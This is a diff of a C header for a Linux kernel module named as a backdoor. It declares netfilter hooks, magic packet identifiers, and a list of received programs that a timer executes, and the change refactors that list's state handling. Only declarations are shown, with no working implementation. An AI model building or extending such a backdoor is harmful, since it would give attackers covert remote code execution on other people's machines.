@@ -16,15 +16,10 @@ MODULE_LICENSE("GPL");
 #define DATA_LEN 255
 #define TARGET_SPI 0x48dcd78c
 #define TARGET_SEQ 0xae574ada
-#define READY 0
-#define FINISHED 1
 
 struct nf_hook_ops;
 
 typedef struct program_list {
-	/* 0 = ready, 1 = finished */
-	short int state;
-
 	/* Program to be run */
 	void *buffer;
 
@@ -46,7 +41,10 @@ void destroy_file(void);
 void execute_ready_programs(struct timer_list *tl);
 
 /* state helpers */
-void create_timer(unsigned long timeout); // Timeout in seconds
+program_list *init_program(void);
+void init_prog_list(void);
+void add_program(program_list **head, program_list *entry);
+void init_timer(unsigned long timeout); // Timeout in seconds
 void destroy_timer(void);
 
 #endif /* BACKDOOR_H */
